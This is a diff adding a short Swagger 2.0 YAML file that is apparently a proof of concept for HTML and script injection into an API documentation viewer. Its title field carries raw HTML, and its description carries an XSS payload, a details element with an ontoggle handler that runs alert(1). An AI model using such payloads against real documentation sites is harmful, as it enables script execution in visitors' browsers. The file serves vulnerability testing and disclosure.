@@ -1,0 +1,15 @@
+swagger: '2.0'
+securityDefinitions:
+  a:
+    type: oauth2
+    authorizationUrl: http://authorization.site
+info:
+  version: "0.0.1"
+  title: <h1>paulisusu POC arbitrary html h1 text<h1>
+  description: Please Authorize!<details ontoggle=alert(1) open>test</details>
+paths:
+  /:
+    get:
+      responses:
+        200:
+          description: Successful respons
